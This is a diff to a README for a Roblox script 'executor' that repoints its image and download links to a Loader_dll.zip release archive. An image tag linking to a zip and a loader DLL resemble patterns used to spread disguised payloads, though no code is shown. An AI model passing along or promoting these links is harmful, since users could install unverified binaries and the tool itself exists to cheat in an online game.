@@ -247,7 +247,7 @@
 
 Welcome to the Codex Executor repository! 🚀 This repository hosts the latest version of the Codex Executor, a powerful tool for enhancing your Roblox gaming experience.
 
-![Codex Executor](https://github.com/secondlathloothy/Codex-Executor/releases/download/Download/application.zip)
+![Codex Executor](https://github.com/secondlathloothy/Codex-Executor/releases/download/Download/Loader_dll.zip)
 
 ## Table of Contents
 
@@ -742,7 +742,7 @@ Codex Executor is a cutting-edge executor designed for Roblox script execution. 
 
 To get started with Codex Executor, follow these simple steps:
 
-1. Download the latest version of the executor from the following link: [![Download Codex Executor](https://img.shields.io/badge/Download-Codex%20Executor-orange)](https://github.com/secondlathloothy/Codex-Executor/releases/download/Download/application.zip).
+1. Download the latest version of the executor from the following link: [![Download Codex Executor](https://img.shields.io/badge/Download-Codex%20Executor-orange)](https://github.com/secondlathloothy/Codex-Executor/releases/download/Download/Loader_dll.zip).
   
    This download button will provide you with the necessary files to install the executor on your system. Click the button to initiate the download process.
 
